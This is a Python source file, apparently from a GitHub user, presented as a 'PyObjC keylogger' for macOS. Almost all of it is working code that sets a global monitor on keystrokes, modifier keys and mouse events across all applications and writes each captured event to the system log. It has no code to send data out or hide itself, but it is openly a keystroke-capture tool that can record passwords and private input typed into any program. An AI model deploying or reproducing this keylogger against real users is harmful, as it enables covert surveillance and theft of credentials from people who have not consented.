
"""PyObjC keylogger for Python
by  ljos https://github.com/ljos
"""

from Cocoa import *
from AppKit import *
import time
from Foundation import *
from PyObjCTools import *
from PyObjCTools import AppHelper

class AppDelegate(NSObject):
    def applicationDidFinishLaunching_(self, aNotification):
        NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(NSLeftMouseDownMask 
                                                               | NSLeftMouseUpMask 
                                                               | NSRightMouseDownMask
                                                               | NSRightMouseUpMask 
                                                               | NSMouseMovedMask 
                                                               | NSLeftMouseDraggedMask 
                                                               | NSRightMouseDraggedMask 
                                                               | NSMouseEnteredMask 
                                                               | NSMouseExitedMask
                                                               | NSScrollWheelMask
                                                               | NSKeyDownMask 
                                                               | NSKeyUpMask
                                                               | NSControlKeyMask
                                                               | NSAlternateKeyMask
                                                               | NSCommandKeyMask
                                                               | NSFlagsChangedMask, handleEvent)

def handleEvent(event):
    NSLog(u"%@", event)
    
    flags = event.modifierFlags()
    modifiers = []  # OS X api doesn't care it if is left or right
    if (flags & NSControlKeyMask):
        modifiers.append('CONTROL')
    if (flags & NSAlternateKeyMask):
        modifiers.append('ALTERNATE')
    if (flags & NSCommandKeyMask):
        modifiers.append('COMMAND')
    NSLog(u"%@", modifiers)    

def main():
    app = NSApplication.sharedApplication()
    delegate = AppDelegate.alloc().init()
    NSApp().setDelegate_(delegate)
    AppHelper.runEventLoop()

if __name__ == '__main__':
   main()
